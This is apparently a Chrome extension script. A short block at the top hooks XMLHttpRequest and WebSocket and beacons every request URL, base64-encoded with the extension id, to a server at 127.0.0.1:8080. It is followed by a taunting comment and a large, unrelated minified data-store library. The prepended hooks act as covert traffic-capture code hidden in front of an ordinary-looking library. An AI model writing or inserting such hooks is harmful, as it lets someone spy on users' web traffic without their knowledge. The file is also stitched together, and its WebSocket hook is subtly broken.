function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var CSSql=function(){function e(){return this.constructor!==e?t||new e:t?t:(t=this,void 0)}var t,n={},r=e.prototype,a=e;return a.SCOPE_PAGE="page",a.SCOPE_SESSION="session",a.SCOPE_LOCAL="local",n.defaultScope=a.SCOPE_PAGE,n.findUC=/[A-Z]/g,n.stripQuotes=/"?((?:\\"|[^"])*)"?/,n.nameValue=/(?:(\w+[\$\|~\^\*]?=)(\w+|"(?:\\"|[^"])*")(?:\s*,\s*)?)/g,n.findOR=/\|\|/g,n.schemas={},n.defaults={},n.hyphUC=function(e){return"-"+e.toLowerCase()},n.nv2dataAttr=function(e,t,r){return"[data-"+t.replace(n.findUC,n.hyphUC)+r.replace(n.stripQuotes,'"$1"]')},n.parseWhere=function(e){return'meta[name^="data"]'+e.replace(n.nameValue,n.nv2dataAttr).replace(n.findOR,',meta[name^="data"]')},n.parseProperties=function(e){for(var t={},r=e.split(","),a=r.length;a--;){var o=r[a].split("=").concat([""]);t[o[0]]=o[1].replace(n.stripQuotes,"$1")}return t},n.parseOrderBy=function(e,t){if(!e.length)return[];for(var n,r=e.split(","),a=[],o=r.length;o--;)if(n=r[o].split(" ").concat(""),-1!==t.indexOf(n[0]))switch(n[1].charAt(0).toLowerCase()){case"[":a.push({field:n[0],order:"values",values:n[1].split("").splice(1).reverse().splice(1).reverse().join("").split("|")});break;case"d":a.push({field:n[0],order:"desc",check:-1===n[1].indexOf("#")?"a":"#"});break;default:a.push({field:n[0],order:"asc",check:-1===n[1].indexOf("#")?"a ":"#"})}return a.reverse()},n.checkOrder=function(e,t,n){for(var r=-1,a=n.length;++r<a;){var o=n[r];switch(o.order){case"asc":if("#"===o.check&&Number(e[o.field])<Number(t[o.field])||e[o.field]<t[o.field])return-1;if("#"===o.check&&Number(e[o.field])>Number(t[o.field])||e[o.field]>t[o.field])return 1;break;case"desc":if("#"===o.check&&Number(e[o.field])>Number(t[o.field])||e[o.field]>t[o.field])return-1;if("#"===o.check&&Number(e[o.field])<Number(t[o.field])||e[o.field]<t[o.field])return 1;break;case"values":var i=o.values.indexOf(e[o.field]),s=o.values.indexOf(t[o.field]);if(i===s)continue;if(-1===s||s>i)return-1;if(-1===i||i>s)return 1}}return 0},n.multidimBinaryInsert=function(e,t,r){for(var a=t.length-1,o=0,i=a;i>=o;){var s=o+i>>1,c=n.checkOrder(e,t[s],r);c>=0?o=s+1:i=s-1}return t.splice(o,0,e),t},n.compressSaveString=function(e,t,r){for(var a,o,i,s,c="",a=t.length;a--;)o=a.toString(32),i=t[a].replace(n.findUC,n.hyphUC),c+=(c.length?",":"")+i+"="+o,s=new RegExp("\bdata-"+i+"=","g"),r=r.replace(s,"d-"+o+"=");return r=r.replace(/<meta /g,"<m "),r=r.replace(new RegExp('\bname="data-'+e+'"',g),'n="d-sc"'),r=r.replace(new RegExp('\bname="schema-'+e+'"',g),'n="s-sc"'),c="["+c+"]",r=c+r},n.uncompressSaveString=function(e,t){var n,r,a,o,i,s;for(r=(t.match(/^\[([^\]]*)\]/)||["",""])[1],n=r.split(","),t=t.replace(/<m /g,"<meta "),t=t.replace(/\bn="d-sc"/g,'name="data-'+e+'"'),t=t.replace(/\bn="s-sc"/g,'name="schema-'+e+'"'),a=n.length;a--;)r=n[a].split("="),i=r[0],o=r[1],s=new RegExp("\bd-"+o+"=",g),t=t.replace(s,"data-"+i+"=");return t},n.nodeListToArray=function(e,t,n){var r,a;return void 0===t?[].slice.call(e,0):(void 0===n?(r=0,a=0>t?Math.max(l.length-t,0):t):(0>t&&(t=Math.max(l.length-t,0)),0>n&&(n=Math.max(l.length-n,0)),r=Math.min(t,n),a=Math.max(t,n)),[].slice.call(e,r,a))},n.getData=function(e,t,r,a){var o,i=n.schemas[e];return i&&(t=t&&"*"!==t?n.parseWhere(t):'meta[name^="data"]',o=i.querySelectorAll(t))?n.nodeListToArray(o,r,a):!1},n.listToFragment=function(e,t){for(var n=!t,r=document.createDocumentFragment(),a=e.length;a--;)r.insertBefore(n?e[a]:e[a].cloneNode(),r.firstChild);return r},r.schemas=function(){return Object.keys(n.schemas)},r.exists=function(e){return e in n.schemas},r.define=function(e,t){e+="";var r,a,o=n.schemas[e]=document.createDocumentFragment(),i=document.createElement("meta");o.appendChild(i),i.name="schema-"+e,i.content="",t===t+""?(r=n.parseProperties(t),a=Object.keys(r)):(a=Object.keys(t),r=t);var s=n.defaults[e]=document.createElement("meta");s.name="data-"+e;for(var c=a.length;c--;){var l=a[c],d=r[a[c]]+"";s.dataset[l]=d,d.length&&(d=d.match(/\W/)?'="'+d+'"':"="+d),i.content+=i.content.length?","+l+d:l+d}},r.findOnPage=function(){var t=document.querySelectorAll('meta[name^="schema-"]');if(t)for(var n=t.length;n--;)this.load(t[n].name.replace(/^schema-/,""),e.SCOPE_PAGE)},r.load=function(t,r,a,o){var i,s;if(o&&t in _schemas)return this.append(t,r,a);switch(a=void 0===a?"":"-"+a,r||n.defaultScope){case e.SCOPE_LOCAL:s=document.createElement("div"),s.innerHTML=localStorage.getItem("CSSql-"+t+a),i=n.listToFragment(s.childNodes);break;case e.SCOPE_SESSION:s=document.createElement("div"),s.innerHTML=sessionStorage.getItem("CSSql-"+t+a),i=n.listToFragment(s.childNodes);break;case e.SCOPE_PAGE:default:i=document}return this.loadFromElement(i,t,o)},r.loadFromElement=function(e,t,r){if(r&&t in _schemas)return this.appendFromElement(e,t);name=void 0===name?"":"-"+name;var a,o,i,s=e.querySelector('meta[name="schema-'+t+'"]');if(s&&s.content){a=n.parseProperties(s.content),k=Object.keys(a);for(var c=k.length;c--;)k[c]in s.dataset&&(a[k[c]]=s.dataset[k[c]])}else s=e.querySelector('meta[name="data-'+t+'"]'),s&&(a=Object.keys(s.dataset).join(","));if(!a)return!1;this.define(t,a);for(var o=e.querySelectorAll('meta[name="data-'+t+'"]'),i=n.schemas[t],l=o.length;l--;)i.appendChild(o[l].cloneNode());return!0},r.fromIndexedDB=function(e,t,r,a,o,i){if(!indexedDB)throw Error("IndexedDB not supported");r=r||e;var t,s,c,l,d,u,f,h,m,p=n.schemas[e],g=n.defaults[e],v=Object.keys(g.dataset),S=v.length;i||this.delete(e),t=indexedDB.open(t),t.onerror=function(e){throw e},t.onsuccess=function(e){s=e.target.result.transaction([r]),s.onerror=t.onerror,s.oncomplete=a||function(){},c=s.objectStore(r),c.onerror=t.onerror,l=c.openCursor(o),l.onerror=t.onerror,l.onsuccess=function(){if(d=event.target.result){for(f=d.value,u=g.cloneNode(),h=S;h--;)m=v[h],u.dataset[m]=f[m];p.appendChild(u),d.continue()}}}},r.toIndexedDB=function(e,t,n,r,a,o){var i,s,c,l,d=this.select(e,r);d&&(t=t||"CSSql",n=n||e,i=indexedDB.open(t),i.onerror=function(e){throw e},i.onsuccess=function(e){function r(){for(l=d.length;l--;)c.add(d[l])}var u=e.target.result;if(-1===[].indexOf.call(u.objectStoreNames,n)){var f=i.onerror,h=i.onsuccess;return u.createObjectStore(n),u.onclose=function(){i=indexedDB.open(t,u.version+.1),i.onerreor=f,i.onsuccess=h,i.onupgradeneeded=function(e){e.target.result.createObjectStore(n)}},u.close(),void 0}if(s=u.transaction([n]),s.onerror=i.onerror,s.oncomplete=a||function(){},c=s.objectStore(n),c.onerror=i.onerror,o)r();else{var m=c.clear();m.onnerror=i.onerror,m.onsuccess=r}})},r.append=function(e,t,r){r=void 0===r?"":"-"+r;var o,i,s=n.schemas[e];if(!s)return!1;switch(t){case a.SCOPE_LOCAL:i=document.createElement("div"),i.innerHTML=localStorage.getItem("CSSql-"+e+r),o=n.listToFragment(i.childNodes);break;case a.SCOPE_SESSION:i=document.createElement("div"),i.innerHTML=sessionStorage.getItem("CSSql-"+e+r),o=n.listToFragment(i.childNodes);break;case a.SCOPE_PAGE:default:o=document}return this.appendFromElement(o,e)},r.appendFromElement=function(e,t){var r=n.schemas[t],a=e.querySelectorAll('meta[name="data-'+t+'"]');if(!r)return!1;if(a){for(var o=a.length;o--;)r.appendChild(a[o].cloneNode());return a.length}return!1},r.save=function(t,r,a,o,i){o=void 0===o?"":"-"+o;var s,c=n.getData(t,a),l=n.listToFragment(c,!0);switch(i&&l.insertBefore(_schemas[t].querySelector('meta[name^="schema"]').cloneNode(),l.firstChild),r){case e.SCOPE_LOCAL:s=document.createElement("div"),s.appendChild(l),localStorage.setItem("CSSql-"+t+o,s.innerHTML);break;case e.SCOPE_SESSION:s=document.createElement("div"),s.appendChild(l),sessionStorage.setItem("CSSql-"+t+o,s.innerHTML);break;case e.SCOPE_PAGE:default:a=n.parseWhere(a),i?n.listToFragment(document.querySelectorAll('meta[name="schema-'+t+'"],'+a)):n.listToFragment(document.querySelectorAll(a)),document.querySelector("head").appendChild(l)}},r.defaultValues=function(e,t){var r,a,o=_defaults[e],i=!1;if(t?t===t+""&&(t=n.parseProperties(t)):t={},o&&o.dataset)for(i={},r=Object.keys(o.dataset),a=r.length;a--;)t.hasOwnProperty(r[a])&&(o.dataset[r[a]]=t[r[a]]),i[r[a]]=o.dataset[r[a]];return i},r.properties=function(e){var t,r=n.defaults[e];return r&&r.dataset&&(t=Object.keys(r.dataset)),t},r.count=function(e,t){var r=n.getData(e,t);return r?r.length:!1},r.select=function(e,t,r,a,o){var i,s,c,l,d,u,f,h=n.defaults[e];if(h&&(c=Object.keys(h.dataset),i=n.parseOrderBy(r||"",c),s=i.length?n.getData(e,t):n.getData(e,t,a,o))){if(u=[],i.length){for(l=s.length;l--;){for(f={},d=c.length;d--;f[c[d]]=s[l].dataset[c[d]]);n.multidimBinaryInsert(f,u,i)}return n.nodeListToArray(u,a,o)}for(l=s.length;l--;)for(u[l]={},d=c.length;d--;u[l][c[d]]=s[l].dataset[c[d]]);return u}return!1},r.insert=function(e,t){var r,a,o,i,s,c,l,d=n.schemas[e],u=n.defaults[e];if(d&&u){for(Array.isArray(t)||(t=[t]),s=-1,c=t.length;++s<c;){for(r=u.cloneNode(),l=t[s],l===l+""&&(l=n.parseProperties(l)),a=Object.keys(r.dataset),i=a.length;i--;)o=a[i],r.dataset[o]=l[o];d.appendChild(r)}return s}return 0},r.update=function(e,t,r,a,o){var i,s,c,l,d,u=n.defaults[e];if(u){for(t===t+""&&(t=n.parseProperties(t)),s=Object.keys(t),d={},l=s.length;l--;)if(s[l]in u.dataset)d[s[l]]=t[s[l]];else if(s.splice(l,1),!s.length)return!1;if(i=n.getData(e,r,a,o)){for(c=i.length;c--;)for(l=s.length;l--;i[c].dataset[s[l]]=d[s[l]]);return i.length}}return!1},r.delete=function(e,t,r,a){var o,i,s,c=n.defaults[e];if(c&&(o=n.getData(e,t,r,a))){for(s=n.schemas[e],i=o.length;i--;s.removeChild(o[i]));return o.length}return!1},e}(),MessageDeligate=function(){function e(){return this.constructor!==e?new e:(Object.defineProperty(this,"__ident__",{value:Object.__identseed__++}),n.initialize(this),void 0)}Object.__identseed__||(Object.__identseed__=1);var t=e.prototype,n={},r={},a=e;return n.initialize=function(e){var t=r[e.__ident__]={};t.actions={},t.defaultAction=function(){}},t.setDefault=function(e){if(!e||"function"!=typeof e)throw Error("'action' must be a function");r[this.__ident__].defaultAction=e},t.getListenerNames=function(){return Object.keys(r[this.__ident__].actions)},t.addListener=function(e,t){var n=r[this.__ident__],a=n.actions[e];if(!t||"function"!=typeof t)throw Error("'action' must be a function");return a?-1===a.indexOf(t)?(a.push(t),!0):!1:(n.actions[e]=[t],!0)},t.replaceListener=function(e,t,n,a){var o=r[this.__ident__],i=o.actions[e],s=i?i.indexOf(t):-1;if(!n||"function"!=typeof n)throw new Error("'newAction' must be a function");if(s>-1)return i[s]=n,!0;if(a)throw new Error("'oldAction' not found");return this.addListener(e,n)},t.removeListener=function(e,t,n){var a=r[this.__ident__],o=a.actions[e],i=o?o.indexOf(t):-1;return n?(delete a.actions[e],o):i>-1?(o.length<=1&&delete a.actions[e],o.splice(i,1)):!1},t.haveListener=function(e,t){var n=r[this.__ident__],a=n.actions[e],o=a?t?a.indexOf(t):a.length-1:-1;return!!(o+1)},t.fireListener=function(e,t,n,a){var o=r[this.__ident__],i=o.actions[e];if(i&&i.length)for(var s=-1,c=i.length;++s<c;)i[s](t,n,a);else o.defaultAction(t,n,a)},t.clearAllListeners=function(){n.initialize(this)},a.destroy=function(t){t instanceof e&&delete r[t.__ident__]},e}();